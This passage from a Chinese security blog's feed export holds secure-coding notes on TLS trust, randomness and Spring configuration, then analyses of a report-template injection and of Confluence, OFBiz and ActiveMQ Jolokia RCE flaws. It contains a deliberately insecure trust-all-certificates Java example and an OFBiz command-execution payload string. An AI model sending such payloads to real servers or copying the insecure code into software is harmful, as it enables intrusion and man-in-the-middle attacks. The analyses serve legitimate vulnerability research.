id="过于宽泛的证书信任"><a href="#过于宽泛的证书信任" class="headerlink" title="过于宽泛的证书信任"></a>过于宽泛的证书信任</h2><p><strong>问题描述：</strong><br>在SSL&#x2F;TLS连接中，过于宽泛的证书信任指的是应用程序配置为信任广泛范围内的证书，包括那些不应被信任的证书。例如，一个应用程序可能配置为信任任何由特定国家的证书颁发机构（CA）签发的证书，或者不正确地配置为信任所有自签名的证书。这种宽泛的信任策略会降低应用程序的安全性，使其容易受到中间人攻击（MITM），在这种攻击中，攻击者可以使用无效或未经验证的证书来拦截或篡改加密的通信。<br>例如如下代码信任所有的证书：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InsecureTrustManager</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">SSLContext</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> SSLContext.getInstance(<span class="hljs-string">&quot;TLS&quot;</span>);<br>        TrustManager[] trustAllCerts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TrustManager</span>[] &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">X509TrustManager</span>() &#123;<br>                <span class="hljs-keyword">public</span> java.security.cert.X509Certificate[] getAcceptedIssuers() &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br>                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkClientTrusted</span><span class="hljs-params">(java.security.cert.X509Certificate[] certs, String authType)</span> &#123; &#125;<br>                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkServerTrusted</span><span class="hljs-params">(java.security.cert.X509Certificate[] certs, String authType)</span> &#123; &#125;<br>            &#125;<br>        &#125;;<br>        sc.init(<span class="hljs-literal">null</span>, trustAllCerts, <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.security.SecureRandom());<br>        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());<br>        <span class="hljs-comment">// 这种做法非常不安全，因为它信任所有证书</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>修复建议：</strong></p><ol><li>使用受信任的CA列表：应用程序应仅信任由已知可靠的证书颁发机构签发的证书。这可以通过配置服务器或客户端应用程序使用包含这些受信任CA的列表来实现。</li><li>验证证书链：确保应用程序在建立SSL&#x2F;TLS连接时验证整个证书链，包括根证书和所有中间证书。</li><li>证书固定（Certificate Pinning）：通过证书固定，应用程序只信任预设（或固定）的一个或多个特定证书或公钥。这可以有效防止信任被恶意或错误颁发的证书。</li><li>禁用自签名证书的信任：除非在特定的、受控的环境中（如内部测试环境），否则不应信任自签名证书。</li><li>定期更新信任存储：定期更新包含受信任证书颁发机构的信任存储，以包括新的CA和剔除已不再安全或已被撤销的CA。</li></ol><p>例如如下代码使用系统默认的信任管理器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecureTrustManager</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">SSLContext</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> SSLContext.getInstance(<span class="hljs-string">&quot;TLS&quot;</span>);<br>        sc.init(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.security.SecureRandom()); <span class="hljs-comment">// 使用系统默认的信任管理器</span><br>        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());<br>        <span class="hljs-comment">// 使用系统默认的信任管理器可以确保只信任由受信任CA签发的证书</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h3 id="弱随机性"><a href="#弱随机性" class="headerlink" title="弱随机性"></a>弱随机性</h3><p><strong>问题描述：</strong><br>弱随机性问题发生在软件系统使用了不够强大的随机数生成器（RNG），尤其是在安全相关的上下文中，如生成会话标识符、密码或加密密钥时。使用弱随机数生成器产生的值可能容易被预测，从而使得系统容易受到攻击，如重放攻击、会话劫持和其他基于预测随机数的攻击。这类问题尤其在使用标准的数学函数库生成“伪随机数”时显著，这些随机数实际上是可以被预测的，特别是如果攻击者知道了生成算法和用于种子的初始值。<br><strong>修复建议：</strong></p><ol><li>使用密码学安全的随机数生成器（CSPRNG）：选择一种专为安全目的设计的随机数生成器，如Java中的SecureRandom类，而不是简单的Random类。</li><li>定期更换随机数生成器的种子：在可能的情况下，定期更新随机数生成器的种子值，尤其是在检测到可能的安全事件后。</li><li>避免自定义随机数生成算法：尽可能使用经过验证的库和函数，避免自定义算法，因为这些可能会有未被发现的弱点。</li><li>增加随机性：对于要求较高的安全应用，可以考虑结合多个随机源来增加随机性。</li><li>进行安全评估：定期对使用的随机数生成策略进行安全评估，确保其仍能满足当前的安全需求。</li></ol><h3 id="Spring默认配置不当"><a href="#Spring默认配置不当" class="headerlink" title="Spring默认配置不当"></a>Spring默认配置不当</h3><p><strong>问题描述：</strong><br>在使用Spring Boot和相关安全框架时，management.security.enabled配置负责开启或关闭对管理端点的安全性控制。如果该配置设置不当，可能会导致敏感的管理端点（如metrics, health, info等）暴露给未授权的用户。例如，将management.security.enabled设置为false会关闭所有管理端点的安全控制，使得任何人都能访问这些端点，这可能导致敏感信息泄露或被恶意利用。<br><strong>修复建议：</strong></p><ol><li>默认启用安全性控制：始终确保management.security.enabled配置项默认为true，以便所有管理端点都受到安全性控制。</li><li>明确授权访问：使用角色和权限控制来确保只有授权的用户可以访问管理端点。这可以通过Spring Security或相应的安全框架来实现。</li><li>限制网络访问：通过网络配置，例如防火墙或安全组，限制对管理端点的访问，确保只有可信的内部网络可以访问这些端点。</li><li>使用多层安全防护：结合使用多种安全措施，如身份验证、授权、日志记录和监控，来增强对管理端点的保护。</li><li>定期审查和更新配置：随着应用和安全需求的变化，定期审查和更新相关的安全配置。</li></ol>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全杂谈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>某报表模板注入</title>
    <link href="/2024/07/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/07/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="某报表模板注入"><a href="#某报表模板注入" class="headerlink" title="某报表模板注入"></a>某报表模板注入</h1><p>这次公布的漏洞说是SQL注入，实际上是一个模板注入。</p><p>在产品中存在一个名为<code>TemplateUtils</code> 的类，这个类用来处理表达式相关的内容。</p><p>传进来的表达式会进入<code>render</code>方法进行渲染：</p><img src="/2024/07/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240723224905849-1726106018720-2.png" class="" title="image-20240723224905849"><p>进去看模板参数渲染使用的方法<code>renderParameter4Tpl</code> ，其中一直在调用同名方法<code>render</code> ，最开始传入了一个新的<code>Calculator</code> ：</p><img src="/2024/07/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240723225237830.png" class="" title="image-20240723225237830"><p>中间有一个<code>evalRenderAction</code> 指定了<code>RenderAction</code>，其他的信息不太重要，往后看：</p><img src="/2024/07/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240723232033511.png" class="" title="image-20240723232033511"><p>进到最后一个<code>renderTpl</code>后看到了解析表达式的位置，通过<code>ParameterProvider.PARAMETERPATTERN</code>进行解析，然后就会获得表达式中的内容。</p><img src="/2024/07/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240723225516954.png" class="" title="image-20240723225516954"><img src="/2024/07/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240723225420954.png" class="" title="image-20240723225420954"><p>经过处理后这里就会取出<code>$&#123;&#125;</code>中的内容，然后送到下面用前面传入的<code>RenderAction</code>进行渲染：</p><img src="/2024/07/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240723230757983.png" class="" title="image-20240723230757983"><img src="/2024/07/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240723230545758.png" class="" title="image-20240723230545758"><p>调用<code>var2.render</code>自然也就是前面传进来的<code>evalRenderAction</code> 了：</p><img src="/2024/07/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240723231732934.png" class="" title="image-20240723231732934"><p>继续往下，会走到<code>evalString</code> ，在这里，会将传入的内容转换为<code>Expression</code> </p><img src="/2024/07/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240723233046321.png" class="" title="image-20240723233046321"><p>然后跟入这个<code>eval</code>,发现了下一个<code>eval</code>,这里就是前面的<code>Calculator</code>下的方法了：</p><img src="/2024/07/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240723233646180.png" class="" title="image-20240723233646180"><p>接下来会去调用下一个<code>eval</code> ，这里就是前面表达式的<code>eval</code> ，实际调用的是<code>RelationExpression</code> 父类<code>BinaryExpression</code> 的<code>eval</code> ：</p><img src="/2024/07/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240724002636625.png" class="" title="image-20240724002636625"><p>然后就是是调用下一个<code>Node</code> 的<code>eval</code>方法，这里的<code>eval</code>是使用索引进行检测的，实际是获取表达式<code>=</code> 右边的内容，如果是函数的话就是<code>FunctionCall</code>：</p><img src="/2024/07/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240724002924552.png" class="" title="image-20240724002924552"><p><code>FunctionCall.eval</code>方法会去调用<code>resolveMethod</code>，这也是这个漏洞的关键：</p><img src="/2024/07/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240724003555779.png" class="" title="image-20240724003555779"><p><code>resolveMethod</code> 最终会获取一个命名空间然后调用<code>getMethod</code> ：</p><img src="/2024/07/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240724003707923.png" class="" title="image-20240724003707923"><img src="/2024/07/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240724003842295.png" class="" title="image-20240724003842295"><img src="/2024/07/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240724003943915.png" class="" title="image-20240724003943915"><p>到了函数调用，也就是漏洞发生的地方，存在<code>getMethod</code> 相关的实现类中<code>DefaultNameSpace</code> 类的<code>getMethod</code> 这里通过传入的内容去加载类：</p><img src="/2024/07/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240724004715865.png" class=""><p>实际会去调用<code>com.fr.function.xxx</code>,这个包里面有很多函数可以调，返回后去调用<code>evalExpression</code> ：</p><img src="/2024/07/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240724005229688.png" class="" title="image-20240724005229688"><img src="/2024/07/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240724005158851.png" class="" title="image-20240724005158851"><p>网传为<code>SQL</code>，看下<code>SQL</code> 类，应该不用多说了吧：</p><img src="/2024/07/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240724005341582.png" class="" title="image-20240724005341582"><img src="/2024/07/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240724005009251.png" class="" title="image-20240724005009251"><p>至于入口：<img src="/2024/07/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240724013008799.png" class="" title="image-20240724013008799"></p><p>其实可玩性还是挺高的，也不一定非要用SQL的形式去做POC来检测。</p><p>现已加入豪华检测套餐：</p>]]></content>
    
    
    <categories>
      
      <category>2024_VULN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>(CVE-2023-22527)Atlassian Confluence - Remote Code Execution</title>
    <link href="/2024/01/23/CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/"/>
    <url>/2024/01/23/CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution"><a href="#CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution" class="headerlink" title="(CVE-2023-22527)Atlassian Confluence - Remote Code Execution"></a>(CVE-2023-22527)Atlassian Confluence - Remote Code Execution</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p> Atlassian Confluence 存在模板注入代码执行漏洞，攻击者可构造恶意请求触发模板注入进而造成远程命令执行。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>停止更新的各个版本以及：<br>8.4.0 &lt;&#x3D; Confluence Data Center and Server &lt;&#x3D; 8.4.4<br>8.5.0 &lt;&#x3D; Confluence Data Center and Server &lt;&#x3D; 8.5.3<br>8.6.0 &lt;&#x3D; Confluence Data Center &lt;&#x3D; 8.6.1</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>还是老样子，diff一下代码发现confluence的一些修改，有一个删除了的文件引起注意：</p><img src="/2024/01/23/CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123001830674.png" class=""><p>删除了：</p><img src="/2024/01/23/CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123001835407.png" class=""><p>ConfluenceStrutsUtil继承自VelocityStrutsUtil：</p><img src="/2024/01/23/CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123001841567.png" class=""><p>VelocityStrutsUtil又继承自StrutsUtil，看到这里推测velocity模板注入。<br>具体应该和前几次有几分相似，velocity解析导致的<code>ognl</code>表达式执行，于是可以去看vm文件。<br>再看vm文件的时候，犯了一个很大的错误，我在重置密码这里看了好久，但是始终是没有结果，它是从action里面读取的变量，所以应该不存在漏洞了，通过vm文件进行访问的时候并不能设置这个值。</p><img src="/2024/01/23/CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123001846042.png" class=""><p>又正值年终总结正好很忙，于是就暂且搁置。<br>后来发现GitHub上多了一个项目<a href="https://github.com/Sudistark/patch-diff-CVE-2023-22527">https://github.com/Sudistark/patch-diff-CVE-2023-22527</a>，里面有所有vm的信息，于是就是直接搜一下：</p><img src="/2024/01/23/CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123001849425.png" class=""><p>于是我尝试一些其他接口，但是都是一无所获，这期间想让Z3教我，得到的回复是：</p><img src="/2024/01/23/CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123002426058.png" class=""><p>最后在<code>text-inline.vm</code>中会调用到findvalue方法从而造成表达式的执行：</p><img src="/2024/01/23/CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123001855784.png" class=""><p>试一下经典poc：</p><img src="/2024/01/23/CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123001859143.png" class=""><p>在StrutsUtil里面果然是找到了这个内容，太长了分开截：</p><img src="/2024/01/23/CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123001903997.png" class=""><img src="/2024/01/23/CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123001922941.png" class=""><p>后面就会按照模板定义的走到<code>findvalue</code>：</p><img src="/2024/01/23/CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123001946487.png" class=""><img src="/2024/01/23/CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123001953026.png" class=""><img src="/2024/01/23/CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123002000159.png" class=""><p>到这里就执行了：</p><img src="/2024/01/23/CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123002018309.png" class=""><p>然后通过getText方法取值，这里发现已经计算完毕了：</p><img src="/2024/01/23/CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123002022472.png" class=""><p>那么这也就通过velocity造成了Ognl表达式执行漏洞。</p><h2 id="关于RCE"><a href="#关于RCE" class="headerlink" title="关于RCE"></a>关于RCE</h2><p>这块可是焦头烂额，尝试构造了几个都没成功执行命令（弹计算器），直到今天看到P牛的vulhub更新了，才想起用回显，这里放下vulhub链接，就不照抄了。<br><a href="https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2023-22527">https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2023-22527</a></p><img src="/2024/01/23/CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123002026504.png" class="">]]></content>
    
    
    <categories>
      
      <category>2024_CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2023-51467 Apache OFBiz: Pre-authentication Remote Code Execution (RCE) vulnerability</title>
    <link href="/2023/12/30/CVE-2023-51467%20%20Apache%20OFBiz_%20Pre-authentication%20Remote%20Code%20Execution%20(RCE)%20vulnerability/"/>
    <url>/2023/12/30/CVE-2023-51467%20%20Apache%20OFBiz_%20Pre-authentication%20Remote%20Code%20Execution%20(RCE)%20vulnerability/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-51467-Apache-OFBiz-Pre-authentication-Remote-Code-Execution-RCE-vulnerability"><a href="#CVE-2023-51467-Apache-OFBiz-Pre-authentication-Remote-Code-Execution-RCE-vulnerability" class="headerlink" title="CVE-2023-51467 Apache OFBiz: Pre-authentication Remote Code Execution (RCE) vulnerability"></a>CVE-2023-51467 Apache OFBiz: Pre-authentication Remote Code Execution (RCE) vulnerability</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>因为前面爆出的OFBiz漏洞中的权限绕过并没有被修复，所以导致了这次的漏洞，通过外部调用groovy并且绕过黑名单达到RCE。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞的位置很简单也很明了：</p><img src="/2023/12/30/CVE-2023-51467%20%20Apache%20OFBiz_%20Pre-authentication%20Remote%20Code%20Execution%20(RCE)%20vulnerability/1703677648017-9c965b63-048d-4fcd-84b9-3483ba12e5f6.png" class=""><p>关键就是我们如何找到一个入口，传入这个expression呢，那么恰好后台有这么个功能可以进行表达式的传入：</p><img src="/2023/12/30/CVE-2023-51467%20%20Apache%20OFBiz_%20Pre-authentication%20Remote%20Code%20Execution%20(RCE)%20vulnerability/1703860971243-0a974dea-3881-4e2c-92ad-4456215d3727.png" class="" title="image.png"><p>查看controller.xml可以知道，这里的类型是一个视图，所以我们直接去看视图的配置：</p><img src="/2023/12/30/CVE-2023-51467%20%20Apache%20OFBiz_%20Pre-authentication%20Remote%20Code%20Execution%20(RCE)%20vulnerability/1703861056964-b99df67d-ba47-4dd6-ad11-118e8558f8ef.png" class="" title="image.png"><p>定位到这么一个文件，去看一下里面的详细信息，接受值的内容如下，后面就是调用shell执行groovy了，就不截图了：</p><img src="/2023/12/30/CVE-2023-51467%20%20Apache%20OFBiz_%20Pre-authentication%20Remote%20Code%20Execution%20(RCE)%20vulnerability/1703861146878-be5b83b6-6c3b-4c36-b5a7-e4b67b6ee6b5.png" class="" title="image.png"><p>最后的执行效果如下：</p><img src="/2023/12/30/CVE-2023-51467%20%20Apache%20OFBiz_%20Pre-authentication%20Remote%20Code%20Execution%20(RCE)%20vulnerability/1703782220217-31942f51-a016-4532-908e-0263a7d1d344.png" class="" title="image.png"><p>其实发现这个漏洞最开始并不是配置文件来的，web界面中有个功能就叫<code>可编程导出</code>，就是这个url，同时参数也是这个参数，通过没有修复的鉴权来绕过登录直接去执行命令。<br>传入的值为：<code>groovyProgram=println+%22calc%22.execute%28%29.text</code>，并没有什么特殊的技术含量，只是执行了execute而已。</p>]]></content>
    
    
    <categories>
      
      <category>2023_CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-41678 Apache ActiveMQ Jolokia RCE</title>
    <link href="/2023/12/01/CVE-2022-41678%20Apache%20ActiveMQ%20Jolokia%20RCE/"/>
    <url>/2023/12/01/CVE-2022-41678%20Apache%20ActiveMQ%20Jolokia%20RCE/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2022-41678-Apache-ActiveMQ-Jolokia-RCE"><a href="#CVE-2022-41678-Apache-ActiveMQ-Jolokia-RCE" class="headerlink" title="CVE-2022-41678 Apache ActiveMQ Jolokia RCE"></a>CVE-2022-41678 Apache ActiveMQ Jolokia RCE</h1><p>ActiveMQ的漏洞最近也有几个，但是因为我已经看到有师傅分析了自己也就没细看，想着后面学一下思路，但是后来就忘了这档子事了，正好昨天又公布了这个去年的老洞，就一口气都写一个学习笔记罢了。（主要是activemq这个产品并没有整体学一遍，正好也简单学一学。<br>此外，对于漏洞官方的细节非常详尽，请看<a href="https://activemq.apache.org/security-advisories.data/CVE-2022-41678-announcement.txt">这里</a>。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p><code>Apache ActiveMQ</code> &lt; 5.16.6<br> 5.17.0 &lt; <code>Apache ActiveMQ</code> &lt; 5.17.4</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>在<code>Apache ActiveMQ</code>中使用<code>Jolokia API</code>时，客户端发送的<code>JSON</code>请求格式依赖于你想执行的具体操作。<code>Jolokia</code>支持多种操作，包括读取<code>MBean</code>属性、执行<code>MBean</code>操作、写入<code>MBean</code>属性等。<br>下面介绍<code>jolokia</code>中的一些基本操作。</p><h3 id="读取-MBean-属性"><a href="#读取-MBean-属性" class="headerlink" title="读取 MBean 属性"></a>读取 MBean 属性</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;read&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;mbean&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.activemq:type=Broker,brokerName=localhost&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;attribute&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;TotalProducerCount&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><img src="/2023/12/01/CVE-2022-41678%20Apache%20ActiveMQ%20Jolokia%20RCE/image-20231201003335267.png" class="" title="image-20231201003335267"><h3 id="执行-MBean-操作"><a href="#执行-MBean-操作" class="headerlink" title="执行 MBean 操作"></a>执行 MBean 操作</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;exec&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;mbean&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.activemq:type=Broker,brokerName=localhost&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;operation&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;addQueue&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;arguments&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;TestQueue&quot;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><img src="/2023/12/01/CVE-2022-41678%20Apache%20ActiveMQ%20Jolokia%20RCE/image-20231201003342466.png" class="" title="image-20231201003342466"><h3 id="写入-MBean-属性"><a href="#写入-MBean-属性" class="headerlink" title="写入 MBean 属性"></a>写入 MBean 属性</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;write&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;mbean&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.activemq:type=Broker,brokerName=localhost&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;attribute&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;SomeAttribute&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;NewValue&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><img src="/2023/12/01/CVE-2022-41678%20Apache%20ActiveMQ%20Jolokia%20RCE/image-20231201003345836.png" class="" title="image-20231201003345836"><h3 id="获取所有-MBeans-的列表"><a href="#获取所有-MBeans-的列表" class="headerlink" title="获取所有 MBeans 的列表"></a>获取所有 MBeans 的列表</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;list&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><img src="/2023/12/01/CVE-2022-41678%20Apache%20ActiveMQ%20Jolokia%20RCE/image-20231201003348573.png" class="" title="image-20231201003348573"><p>好了有了以上内容就足够我们分析本次漏洞了。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>阿里云的情报都说了是<code>Jolokia</code>出的漏洞，自然也就直接diff看一下修复（真不是因为我懒<br>这里就不得不说千万别下5.17，直接用5.16相关版本，环境大坑，我弄了很久。</p><img src="/2023/12/01/CVE-2022-41678%20Apache%20ActiveMQ%20Jolokia%20RCE/image-20231201003358698.png" class="" title="image-20231201003358698"><p>首先通过<code>web.xml</code>定位到<code>jolokia</code>的路径和其使用的<code>servlet</code>。<br>先分析一下<code>org.jolokia.http.AgentServlet</code>中的内容：</p><img src="/2023/12/01/CVE-2022-41678%20Apache%20ActiveMQ%20Jolokia%20RCE/image-20231201003403085.png" class="" title="image-20231201003403085"><img src="/2023/12/01/CVE-2022-41678%20Apache%20ActiveMQ%20Jolokia%20RCE/image-20231201003406901.png" class="" 